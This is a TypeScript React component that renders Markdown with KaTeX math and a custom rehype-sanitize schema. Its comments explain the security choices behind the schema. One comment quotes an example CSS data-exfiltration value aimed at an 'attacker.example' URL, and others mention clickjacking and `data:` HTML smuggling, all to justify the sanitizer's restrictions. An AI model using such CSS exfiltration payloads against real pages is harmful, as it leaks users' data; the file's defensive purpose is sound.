import Markdown, { Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkBreaks from "remark-breaks";
import remarkMath from "remark-math";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import rehypeKatex from "rehype-katex";
import "katex/dist/katex.min.css";
import type { Schema } from "hast-util-sanitize";
import type { PluggableList } from "unified";
import { code } from "./code";
import { ul, ol, li } from "./list";
import { paragraph } from "./paragraph";
import { anchor } from "./anchor";
import { h1, h2, h3, h4, h5, h6 } from "./headings";
import { table, th, td } from "./table";
import { blockquote } from "./blockquote";
import { hr } from "./horizontal-rule";
import { remarkGithubAlerts } from "./remark-github-alerts";

// `remark-math` parses `$inline$` / `$$block$$` into code/pre elements
// classed `math-inline` / `math-display`; `rehype-katex` finds those and
// replaces them with rendered markup. We render MathML only (not KaTeX's
// HTML+CSS box tree) because that tree leans on inline `style` attributes
// for glyph layout, and `MARKDOWN_SANITIZE_SCHEMA` deliberately disallows
// `style` everywhere (see the note below) to keep arbitrary authored HTML
// from smuggling in position/clickjacking tricks. MathML needs no inline
// styles for layout, so it renders correctly even after sanitization, and
// `trust: false` (KaTeX's default) keeps commands like `\href`/`\includegraphics`
// from emitting real links or images.
const KATEX_OPTIONS = {
  output: "mathml",
  trust: false,
  strict: "ignore",
} as const;

// MathML tag/attribute names KaTeX's mathml output can emit (verified by
// scanning katex's MathML builder), added on top of rehype-sanitize's
// HTML-only default schema. None of these attributes carry URLs or CSS
// text, only enumerated/numeric presentation hints, so allowing them
// doesn't reopen the risks the `style`/`data:` restrictions above guard
// against.
const MATHML_TAG_NAMES = [
  "math",
  "semantics",
  "annotation",
  "mrow",
  "mi",
  "mn",
  "mo",
  "ms",
  "mtext",
  "mspace",
  "msup",
  "msub",
  "msubsup",
  "mfrac",
  "msqrt",
  "mroot",
  "mover",
  "munder",
  "munderover",
  "mtable",
  "mtr",
  "mtd",
  "mstyle",
  "mpadded",
  "mphantom",
  "menclose",
  "mglyph",
];

// Build a sanitize schema that extends rehype-sanitize's defaults with a
// few markdown-friendly additions. The defaults strip `<script>`, event
// handlers, `javascript:` URLs, and most dangerous attributes; we layer
// on:
//   - class / id on common block + inline elements (so authored HTML
//     keeps its hooks for styling in rich previews),
//   - `<img>` (kept disabled in defaults), with safe src schemes only,
//   - `<details>` / `<summary>` for collapsible sections,
//   - `target` / `rel` on anchors so external links keep working.
//
// We deliberately do NOT allow `style` — `rehype-sanitize` cannot parse
// CSS, so allowing `style` would let an authored doc smuggle in
// `background-image: url("https://attacker.example/exfil?…")` (data
// exfiltration), `position: fixed; top: 0; …` (clickjacking overlays),
// or vendor-specific quirks like `expression(…)` on old browsers.
// If we ever need inline styling we should plug in a CSS-property
// sanitizer at that point, not before.
//
// We also deliberately do NOT allow the `data:` protocol — that scheme
// covers arbitrary mime types, not just images, so `<img src="data:text/html,…">`
// would round-trip an HTML document with no schema validation. Inline
// base64 images are a thin convenience we don't actually need in our
// preview, and the cost of allowing them is too high.
// Exported for direct schema tests. End-to-end MarkdownRenderer tests
// can't reach every sanitize concern because our custom `anchor`
// component always hard-codes `target="_blank" rel="noopener noreferrer"`
// — meaning a buggy schema (e.g. one that strips `rel` from HAST) would
// still produce a safe-looking `<a>` in the final DOM. Direct schema
// tests close that gap.
export const MARKDOWN_SANITIZE_SCHEMA: Schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    "*": [...(defaultSchema.attributes?.["*"] ?? []), "className", "id"],
    // `["rel", "noopener", "noreferrer", "nofollow"]` (rehype-sanitize's
    // "[attrName, ...allowed-values]" form) requires `rel` to be EXACTLY
    // one of those tokens — it would strip the standard, space-separated
    // `rel="noopener noreferrer"` and reintroduce a reverse-tabnabbing
    // vector on `target="_blank"` links. None of the `rel` keywords
    // execute code or navigate, so allowing any rel value is safe.
    a: ["href", "title", "target", "rel"],
    img: [
      ...(defaultSchema.attributes?.img ?? []),
      "src",
      "alt",
      "title",
      "width",
      "height",
      "loading",
    ],
    // MathML presentation attributes KaTeX's mathml output emits (see
    // MATHML_TAG_NAMES above). All enumerated/numeric — no URLs, no CSS
    // text — so allowing them doesn't reopen the `style`/`data:` risks
    // this schema otherwise guards against.
    math: ["xmlns", "display"],
    annotation: ["encoding"],
    mo: [
      "stretchy",
      "fence",
      "separator",
      "largeop",
      "movablelimits",
      "lspace",
      "rspace",
      "minsize",
      "maxsize",
    ],
    mfrac: ["linethickness"],
    mtable: [
      "columnalign",
      "columnspacing",
      "columnlines",
      "rowspacing",
      "rowlines",
    ],
    mspace: ["width", "height", "depth"],
    mover: ["accent"],
    munder: ["accentunder"],
    munderover: ["accent", "accentunder"],
    mstyle: ["displaystyle", "scriptlevel", "mathcolor", "mathbackground"],
    mi: ["mathvariant"],
    mn: ["mathvariant"],
    mtext: ["mathvariant"],
  },
  tagNames: [
    ...(defaultSchema.tagNames ?? []),
    ...MATHML_TAG_NAMES,
    "img",
    "details",
    "summary",
    "figure",
    "figcaption",
    "mark",
    "kbd",
    "sub",
    "sup",
  ],
  protocols: {
    ...defaultSchema.protocols,
    src: ["http", "https"],
    href: ["http", "https", "mailto", "tel"],
  },
};

interface MarkdownRendererProps {
  /**
   * The markdown content to render. Can be passed as children (string) or content prop.
   */
  children?: string;
  content?: string;
  /**
   * Additional or override components for markdown elements.
   * Default components (code, ul, ol) are always included unless overridden.
   */
  components?: Partial<Components>;
  /**
   * Whether to include standard components (anchor, paragraph).
   * Defaults to false.
   */
  includeStandard?: boolean;
  /**
   * Whether to include heading components (h1-h6).
   * Defaults to false.
   */
  includeHeadings?: boolean;
  /**
   * Whether to parse and render inline HTML embedded in the markdown
   * source. When `true`, raw HTML is parsed via `rehype-raw` and then
   * sanitized via `rehype-sanitize` with a schema that strips scripts,
   * event handlers, and dangerous URL schemes. Defaults to `true` — the
   * sanitizer makes this safe by construction, and most markdown
   * authoring relies on at least some inline HTML (badges, details
   * blocks, anchor targets, etc.).
   */
  allowHtml?: boolean;
  /**
   * Whether to parse `$...$` / `$$...$$` math syntax via remark-math and
   * render it with KaTeX. Defaults to `true`. Set to `false` for
   * user-authored chat text: a raw shell command or price list routinely
   * contains two dollar signs (`$(seq ...)`, `$5 and $10`), and remark-math's
   * single-`$` heuristic then swallows everything between them and renders
   * it as garbled math glyphs instead of the text the user actually typed.
   */
  enableMath?: boolean;
}

/**
 * A reusable Markdown renderer component that provides consistent
 * markdown rendering across the application.
 *
 * By default, includes:
 * - code, ul, ol components
 * - remarkGfm and remarkBreaks plugins
 *
 * Can be extended with:
 * - includeStandard: adds anchor and paragraph components
 * - includeHeadings: adds h1-h6 heading components
 * - components prop: allows custom overrides or additional components
 */
export function MarkdownRenderer({
  children,
  content,
  components: customComponents,
  includeStandard = false,
  includeHeadings = false,
  allowHtml = true,
  enableMath = true,
}: MarkdownRendererProps) {
  // Build the components object with defaults and optional additions
  const components: Components = {
    code,
    ul,
    ol,
    li,
    hr,
    table,
    th,
    td,
    blockquote,
    ...(includeStandard && {
      a: anchor,
      p: paragraph,
    }),
    ...(includeHeadings && {
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
    }),
    ...customComponents, // Custom components override defaults
  };

  const markdownContent = content ?? children ?? "";

  // `rehype-katex` renders the math elements `remark-math` produced and
  // must run before sanitization so `rehype-sanitize` sees (and can
  // validate) the actual MathML it emits, rather than the placeholder
  // `<code class="math-inline">` it replaces. `rehype-raw` then parses raw
  // HTML embedded in the markdown into the rehype tree, and `rehype-sanitize`
  // strips anything dangerous (scripts, event handlers, `javascript:` URLs,
  // etc.). The order matters: sanitize must run *after* both so it sees the
  // final tree.
  const katexRehypePlugin: PluggableList = enableMath
    ? [[rehypeKatex, KATEX_OPTIONS]]
    : [];
  const rehypePlugins: PluggableList = allowHtml
    ? [
        ...katexRehypePlugin,
        rehypeRaw,
        [rehypeSanitize, MARKDOWN_SANITIZE_SCHEMA],
      ]
    : katexRehypePlugin;

  const remarkPlugins: PluggableList = [
    remarkGithubAlerts,
    remarkGfm,
    remarkBreaks,
    ...(enableMath ? [remarkMath] : []),
  ];

  return (
    <div data-testid="markdown-renderer">
      <Markdown
        components={components}
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
      >
        {markdownContent}
      </Markdown>
    </div>
  );
}
